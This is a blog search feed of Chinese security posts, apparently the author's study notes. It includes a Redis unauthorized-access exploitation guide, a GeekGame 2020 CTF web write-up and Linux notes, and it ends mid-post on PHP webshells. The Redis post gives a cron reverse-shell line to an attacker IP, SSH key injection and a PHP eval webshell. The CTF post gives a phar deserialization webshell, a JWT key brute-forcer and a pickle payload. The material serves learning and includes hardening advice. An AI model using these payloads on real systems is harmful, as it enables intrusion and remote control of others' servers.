<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Redis 未授权访问</title>
      <link href="/2020/06/23/redis-unauthorized-access/"/>
      <url>/2020/06/23/redis-unauthorized-access/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>刷题时遇到了涉及到 Redis 未授权访问的题，发现自己不会，故总结一下 Redis 未授权访问的利用方法</p><h2 id="0x01-Redis-介绍"><a href="#0x01-Redis-介绍" class="headerlink" title="0x01 Redis 介绍"></a>0x01 Redis 介绍</h2><p>Redis 是一个使用 ANSI C 编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库</p><p>Redis 通常将全部的数据存储在内存中，但也可以将数据持久化存储在硬盘中（数据持久化给了我们利用的机会）</p><h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><p>安装 redis 后，在配置文件 <code>redis.conf</code> 中 <code>bind 127.0.0.1 ::1</code> 一行前加 <code>#</code> 将其注释，并将 <code>protected-mode</code> 设为 <code>no</code> ，然后启动 redis-server</p><p>然后在攻击机上输入 <code>redis-cli -h 目标IP</code> 命令连接目标机器的 redis-server，若连接成功则环境搭建完成</p><h2 id="0x03-利用方法"><a href="#0x03-利用方法" class="headerlink" title="0x03 利用方法"></a>0x03 利用方法</h2><h3 id="1-利用-Cron-定时任务反弹-shell"><a href="#1-利用-Cron-定时任务反弹-shell" class="headerlink" title="1. 利用 Cron 定时任务反弹 shell"></a>1. 利用 Cron 定时任务反弹 shell</h3><blockquote><p>关于 Linux Cron 定时任务见另一篇博客 <a href="https://x5tar.com/2020/06/21/linux-crontab/"><a href="https://x5tar.com/2020/06/21/linux-crontab/">Linux Cron 定时任务</a></a></p><p><strong>本方法适用于目标机器以 root 身份启动 Redis 的情况</strong></p></blockquote><p>先在攻击机上监听任意端口 <code>nc -lvvp Port</code></p><p>然后在连接的 redis-cli 执行以下命令（第一行命令可以换为其它任何可以反弹 shell 的命令）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt; set x &quot;\n* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;攻击机IP&#x2F;Port 0&gt;&amp;1\n&quot;</span><br><span class="line">OK</span><br><span class="line">&gt; config set dir &#x2F;var&#x2F;spool&#x2F;cron&#x2F;</span><br><span class="line">OK</span><br><span class="line">&gt; config set dbfilename root</span><br><span class="line">OK</span><br><span class="line">&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure><p>稍等片刻即可在攻击机接收到回弹的 shell</p><p>若长时间未接收到，可尝试将第二行命令中的目录改为 <code>/var/spool/cron/crontabs</code> 再次尝试</p><h3 id="2-写入公钥并利用-ssh-连接"><a href="#2-写入公钥并利用-ssh-连接" class="headerlink" title="2. 写入公钥并利用 ssh 连接"></a>2. 写入公钥并利用 ssh 连接</h3><blockquote><p><strong>本方法适用于目标机器安装并启动了 ssh server 的情况</strong></p><p>使用本方法需要知道启动 redis 的用户的 home 目录</p></blockquote><p>先在攻击机生成 ssh 公钥（已存在公钥无需重复生成，防止覆盖）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure><p>然后在 <code>~/.ssh</code> 目录下执行以下命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) | redis-cli -h 目标机器IP -x set x</span><br></pre></td></tr></table></figure><p>然后在连接的 redis-cli 执行以下命令（此处假设用户为 root，home 目录为 <code>/home</code>）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; config set dir &#x2F;root&#x2F;.ssh</span><br><span class="line">OK</span><br><span class="line">&gt; config set dbfilename authorized_keys</span><br><span class="line">OK</span><br><span class="line">&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure><p>然后在攻击机通过 ssh 连接目标机器即可</p><h3 id="3-写入-webshell"><a href="#3-写入-webshell" class="headerlink" title="3. 写入 webshell"></a>3. 写入 webshell</h3><blockquote><p><strong>本方法适用于 redis 用户权限较低但对 web 目录有写权限的情况</strong></p><p>使用本方法需要知道 web 目录的绝对路径</p></blockquote><p>在连接的 redis-cli 执行以下命令（此处假设目标机器运行 PHP）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt; set x &quot;\n&lt;?php eval($_POST[&#39;cmd&#39;]); ?&gt;\n&quot;</span><br><span class="line">OK</span><br><span class="line">&gt; config set dir &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">OK</span><br><span class="line">&gt; config set dbfilename evil.php</span><br><span class="line">OK</span><br><span class="line">&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure><p>然后连接 webshell 即可</p><h3 id="4-利用-lua-脚本进行操作"><a href="#4-利用-lua-脚本进行操作" class="headerlink" title="4. 利用 lua 脚本进行操作"></a>4. 利用 lua 脚本进行操作</h3><blockquote><p>在其它地方看到的，但是在 Redis 里甚至连 IO 库和 OS 库都不能用，暂未发现可靠的利用方法</p></blockquote><p>从 Redis 2.6.0 版本开始，Redis 内置了 lua 解释器，可以通过 lua 脚本进行一些操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; eval &quot;return &#39;hello&#39;&quot; 0</span><br><span class="line">&quot;hello&quot;</span><br></pre></td></tr></table></figure><h3 id="5-其它方法"><a href="#5-其它方法" class="headerlink" title="5. 其它方法"></a>5. 其它方法</h3><p>既然通过 Redis 未授权访问获得了写入文件的权限，则可根据目标机器启动的服务，针对性的使用其它方法进行进一步渗透</p><h2 id="0x04-安全配置"><a href="#0x04-安全配置" class="headerlink" title="0x04 安全配置"></a>0x04 安全配置</h2><p>Redis 未授权访问危害较大，故根据以上利用方法，可针对性的进行以下配置，增强安全性</p><ol><li><p>仅绑定部分地址，限制可访问的 IP</p></li><li><p>修改 Redis 监听端口</p></li><li><p>为用户设置密码</p></li><li><p>以单独的低权限用户启动 Redis，并禁止登录</p></li><li><p>禁止使用或修改高危命令名称（rename-command）</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB安全 </tag>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux Cron 定时任务</title>
      <link href="/2020/06/21/linux-crontab/"/>
      <url>/2020/06/21/linux-crontab/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在做一道涉及到 redis 未授权访问的题的时候，看到了使用到 <code>/var/spool/cron/</code> 目录反弹 shell</p><p>后查询得知 Linux Cron 定时任务，在此记录下来</p><h2 id="0x01-相关文件"><a href="#0x01-相关文件" class="headerlink" title="0x01 相关文件"></a>0x01 相关文件</h2><p>与 Cron 相关的文件主要存在以下几个目录</p><ul><li><code>/var/spool/cron/</code> 目录下存放的是每个用户的 crontab 任务，每个任务以创建者的名字命名</li><li><code>/etc/crontab</code> 这个文件负责调度各种管理和维护任务</li><li><code>/etc/cron.d/</code> 这个目录用来存放任何要执行的 crontab 文件或脚本</li><li>我们还可以把脚本放在<code>/etc/cron.hourly</code> 、 <code>/etc/cron.daily</code> 、 <code>/etc/cron.weekly</code> 、 <code>/etc/cron.monthly</code> 目录中，让它每小时/天/星期/月执行一次</li></ul><p>其中 <code>/var/spool/cron/</code> 为最常用的脚本存放位置，一般由 <code>crontab</code> 命令操作</p><h2 id="0x02-Crontab-命令操作"><a href="#0x02-Crontab-命令操作" class="headerlink" title="0x02 Crontab 命令操作"></a>0x02 Crontab 命令操作</h2><p>查看 <code>crontab</code> 命令的帮助如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Usage:</span><br><span class="line"> crontab [options] file</span><br><span class="line"> crontab [options]</span><br><span class="line"> crontab -n [hostname]</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line"> -u &lt;user&gt;  define user</span><br><span class="line"> -e         edit user&#39;s crontab</span><br><span class="line"> -l         list user&#39;s crontab</span><br><span class="line"> -r         delete user&#39;s crontab</span><br><span class="line"> -i         prompt before deleting</span><br><span class="line"> -n &lt;host&gt;  set host in cluster to run users&#39; crontabs</span><br><span class="line"> -c         get host in cluster to run users&#39; crontabs</span><br><span class="line"> -V         print version and exit</span><br><span class="line"> -x &lt;mask&gt;  enable debugging</span><br></pre></td></tr></table></figure><p>其中常用的选项有 <code>-e</code> 、 <code>-l</code> 、 <code>-r</code></p><ul><li><code>-e</code> 用于编辑配置文件（即使用默认编辑器编辑 <code>/var/spool/cron/$USER</code> 文件）</li><li><code>-l</code> 用于读取配置文件（即显示 <code>/var/spool/cron/$USER</code> 文件内容）</li><li><code>-r</code> 用于删除配置文件（即删除 <code>/var/spool/cron/$USER</code> 文件）</li></ul><h2 id="0x03-配置文件内容"><a href="#0x03-配置文件内容" class="headerlink" title="0x03 配置文件内容"></a>0x03 配置文件内容</h2><p>做题过程中用到的文件为 <code>/var/spool/cron/root</code></p><blockquote><p><strong>注意：</strong></p><p><code>/var/spool/cron/</code> 目录所有者为 root，权限为 755，只有 root 用户才能创建文件</p><p>但 crontab 生成的配置文件所有者为创建的用户为创建用户，权限为 600</p><p>所以只有在以 root 用户登录或当前登录用户已创建定时任务时才可直接修改该文件</p></blockquote><p>写入的内容为（其中 <code>command</code> 即为反弹 shell 的命令）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* * * * * command</span><br></pre></td></tr></table></figure><p>该文件中一行命令由六部分组成，前五部分分别为 分、时、日、月、周，最后一部分为待执行的命令</p><p>时间部分可用的操作符有</p><ul><li><code>*</code> 所有时间</li><li><code>/</code> 时间间隔</li><li><code>-</code> 时间范围</li><li><code>,</code> 单独的时间</li></ul><p>所以上述写入内容为每隔一分钟执行一次 command，即可达到自动执行的目的</p><p>另附几个上述操作符的使用示例</p><ul><li><code>*/10 8-16 * * * command</code> 每天的 8-16 时每 10 分钟执行一次</li><li><code>0,30 * * * * command</code> 每小时的 0 分和 30 分各执行一次</li><li><code>0 9 */2 * * command</code> 每隔两天的 9:00 执行一次</li><li><code>0,20,40 8-16 * * 6,0 command</code> 每周六和周日的 8-16 时的 0 20 40 分各执行一次</li></ul>]]></content>
      
      
      <categories>
          
          <category> 杂事 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GeekGame 2020 WEB 复现</title>
      <link href="/2020/05/27/geekgame2020/"/>
      <url>/2020/05/27/geekgame2020/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>被川大的同学叫来打这个比赛</p><p>嗯没错这次比赛非常神奇，水出来的 RE 和 Crypto 都比 WEB 多…</p><p>比赛的时候就做出来一道 WEB（真的菜</p><h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p>真的是这次比赛最简单的一道题了</p><p>最常规的二次注入</p><p>先注册一个名为 <code>admin&#39;#</code> 的用户，登录后修改密码</p><p>再用 <code>admin</code> 和修改后的密码登录即可</p><blockquote><p>比赛的时候没发现有源码泄露，直接看 SQL 语句可能更直观一些</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$x=$db-&gt;execute(<span class="string">"update users set password=? where username='$username' "</span>,[<span class="string">'s'</span>,&amp;$password]);</span><br></pre></td></tr></table></figure></blockquote><h2 id="反序列化？"><a href="#反序列化？" class="headerlink" title="反序列化？"></a>反序列化？</h2><p>打开是个文件上传，只能上传图片，并且有个 <code>vulnerable.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'filename'</span>])) &#123;</span><br><span class="line">    $filename = $_GET[<span class="string">'filename'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $filename = <span class="string">""</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $code;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __destruct() method.</span></span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (file_exists($filename)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"文件存在的呢;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"啊这，文件不在哦"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>题名加了个问号，那就不是反序列化，但是还不知道怎么做</p><p>看了官方 WP，这真的涉及到我的知识盲区了</p><p><code>vulnerable.php</code> 中用到了 <code>file_exists</code> 函数</p><blockquote><p>自 PHP 5.0.0 起, 此函数也用于某些 URL 包装器</p><p><code>file_exists</code>函数在检查 phar 包的时候会将其解析</p></blockquote><p>用如下 payload 生成 phar 包</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $code;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($my_code)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;code = $my_code;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'a.phar'</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">'GIF89a&lt;?php __HALT_COMPILER();?&gt;'</span>);</span><br><span class="line">$object = <span class="keyword">new</span> Flag(<span class="string">'eval($_REQUEST["cmd"]);'</span>);</span><br><span class="line">$phar-&gt;setMetadata($object);</span><br><span class="line">$phar-&gt;addFromString(<span class="string">'a.txt'</span>, <span class="string">'a'</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>注意添加文件头绕过文件类型检测，生成后改后缀为 gif 上传，再用 phar 协议读取即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vulnerable.php?filename&#x3D;phar:&#x2F;&#x2F;upload&#x2F;a.gif</span><br></pre></td></tr></table></figure><h2 id="ezcode"><a href="#ezcode" class="headerlink" title="ezcode"></a>ezcode</h2><p>直到比赛结束只有一解的题</p><p>打开可以注册和登录，注册返回一串 JWT，刚开始毫无思路，后来给了一个 hint</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint ：top1000</span><br></pre></td></tr></table></figure><p>？top1000 弱口令吗</p><p>跑了一下果然跑出来了 key</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">token = <span class="string">'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjEyMzQifQ.f_U2qBN5qFbsWyIQhfIGYw2aDzX1QTKefGn-QuZ8FIw'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'top1000.txt'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    top1000 = [i.strip() <span class="keyword">for</span> i <span class="keyword">in</span> f.readlines()]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> top1000:</span><br><span class="line">    test_token = jwt.encode(&#123;<span class="string">'username'</span>:<span class="string">'1234'</span>&#125;, algorithm=<span class="string">'HS256'</span>, key=i).decode()</span><br><span class="line">    <span class="keyword">if</span> test_token == token:</span><br><span class="line">        print(<span class="string">'Found it!'</span>)</span><br><span class="line">        print(i)</span><br><span class="line">        print(jwt.encode(&#123;<span class="string">'username'</span>:<span class="string">'admin'</span>&#125;, algorithm=<span class="string">'HS256'</span>, key=i).decode())</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><img src="/2020/05/27/geekgame2020/JWT.png"><p>用生成的 JWT 登录发现还有第二关，看一下源码有注释</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">want2know=xxx</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span><span class="params">(pickle.Unpickler)</span>:</span></span><br><span class="line">    blacklist = &#123;</span><br><span class="line">        <span class="string">'sys'</span>,<span class="string">'eval'</span>, <span class="string">'exec'</span>, <span class="string">'execfile'</span>, <span class="string">'compile'</span>, <span class="string">'open'</span>, <span class="string">'input'</span>, <span class="string">'__import__'</span>, <span class="string">'exit'</span>,<span class="string">'getattr'</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span><span class="params">(self, module, name)</span>:</span></span><br><span class="line">        <span class="comment"># Only allow safe classes from builtins.</span></span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">"builtins"</span> <span class="keyword">and</span> name <span class="keyword">not</span> <span class="keyword">in</span> self.blacklist:</span><br><span class="line">            <span class="keyword">return</span> getattr(builtins, name)</span><br><span class="line">        <span class="comment"># Forbid everything else.</span></span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">"global '%s.%s' is forbidden"</span> %</span><br><span class="line">                                     (module, name))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">restricted_loads</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">        pickle_data=request.form.get(<span class="string">'data'</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> pickle_data==<span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> open(<span class="string">'templates/pickle.html'</span>).read()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pickle_data=base64.b64decode(pickle_data.encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            op_blackli=[<span class="string">b'R'</span>]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> op <span class="keyword">in</span> op_blackli:</span><br><span class="line">                <span class="keyword">if</span> op <span class="keyword">in</span> pickle_data:</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">'数据非法！'</span>+op.decode()</span><br><span class="line">            data=restricted_loads(pickle_data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">return</span> <span class="string">"请输入正确的数据格式！"</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            secret=request.form.get(<span class="string">'secret'</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> open(<span class="string">'templates/pickle.html'</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> want2know==secret:</span><br><span class="line">            <span class="keyword">return</span> flag</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'欢迎使用HACHp1的pickle测试工具！'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'没有权限查看！\n'</span></span><br></pre></td></tr></table></figure><p>是一个 pickle 反序列化，只看出来禁止用 <code>R</code> 执行函数，然后就不会了（</p><p>看了 WP 这里是利用 <code>globals</code> 或 <code>locals</code> 函数直接修改 <code>want2know</code> 使其与输入的 <code>secret</code> 相等</p><p>出题壬推荐用 <a href="https://github.com/eddieivan01/pker" target="_blank" rel="noopener">pker</a> 构建序列化</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">glo_dic=INST(<span class="string">'builtins'</span>,<span class="string">'globals'</span>)</span><br><span class="line">glo_dic[<span class="string">'want2know'</span>]=<span class="string">'test'</span></span><br><span class="line"><span class="keyword">return</span></span><br></pre></td></tr></table></figure><p>生成 payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&quot;(ibuiltins\nglobals\np0\n0g0\nS&#39;want2know&#39;\nS&#39;test&#39;\ns.&quot;</span><br></pre></td></tr></table></figure><p>base64 一下即可</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>第一道 WEB 比较照顾我这样的菜🐶</p><p>后两道 WEB 质量还是不错的，都涉及到了我不会的知识点</p><p>phar 和 pickle 似乎都是第一次做到</p><p>除了做不出来，体验挺不错的（</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 中的 source 命令（点命令）</title>
      <link href="/2020/05/10/source-command/"/>
      <url>/2020/05/10/source-command/</url>
      
        <content type="html"><![CDATA[<p>在做题的时候遇到了上传了 shell 脚本但是没有执行权限的情况</p><p>测试脚本</p><img src="/2020/05/10/source-command/shell.png" title="shell"><p>本地测试结果</p><img src="/2020/05/10/source-command/denied.png" title="denied"><p>然后就发现了 source 命令</p><img src="/2020/05/10/source-command/source.png" title="source"><p>点命令（错误示范）</p><img src="/2020/05/10/source-command/dot_error.png" title="dot_error"><p>点命令（必须加 ./）</p><img src="/2020/05/10/source-command/dot.png" title="dot"><p>source 命令和点命令在作用上完全相同</p><p>而除了可以不需要执行权限外，source 命令（点命令）还有一个特性，即 source 命令是在本 shell 内执行，而 直接执行脚本是在新开 shell 中执行，即 source 命令可以设置当前 shell 的环境变量，故常用来使修改过的初始化文件（.bashrc .profile 等）立即生效</p><p>测试脚本</p><img src="/2020/05/10/source-command/env.png" title="env"><p>直接执行</p><img src="/2020/05/10/source-command/env_shell.png" title="env_shell"><p>source 命令</p><img src="/2020/05/10/source-command/env_source.png" title="env_source"><p>点命令</p><img src="/2020/05/10/source-command/env_dot.png" title="env_dot">]]></content>
      
      
      <categories>
          
          <category> 杂事 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP 中不包含字母和数字的 webshell</title>
      <link href="/2020/05/03/php-webshell-without-alpha-and-num/"/>
      <url>/2020/05/03/php-webshell-without-alpha-and-num/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>又是好多天没写博客了，就想着再来随便水点什么吧</p><p>这种神奇的题曾经在 <a href="/2019/10/24/cnss-recruit-2019-web-boss/">CNSS Recruit 2019 Web Boss题</a> 中出现过，最近做题又遇到了一次结果还是不会（因为又多过滤了一些符号之前的方法就也不能用了），就把它写下来吧，具体方法有三种，可以灵活使用，这里使用的是 PHP5.6 环境，具体原因会在下文说明，源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/[a-z0-9]/is'</span>,$_GET[<span class="string">'code'</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">'code'</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"nonono!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x01-前置知识（PHP-中的一些特性）"><a href="#0x01-前置知识（PHP-中的一些特性）" class="headerlink" title="0x01 前置知识（PHP 中的一些特性）"></a>0x01 前置知识（PHP 中的一些特性）</h2><ol><li><p>可变函数，即可以用字符串变量充当函数名（eval 等语言结构不可使用）</p><blockquote><p>如果一个变量名后有圆括号，PHP 将寻找与变量的值同名的函数，并且尝试执行它</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   $a = <span class="string">'strrev'</span>;</span><br><span class="line">   $b = <span class="string">'Hello'</span>;</span><br><span class="line">   <span class="keyword">echo</span> $a($b); <span class="comment">// 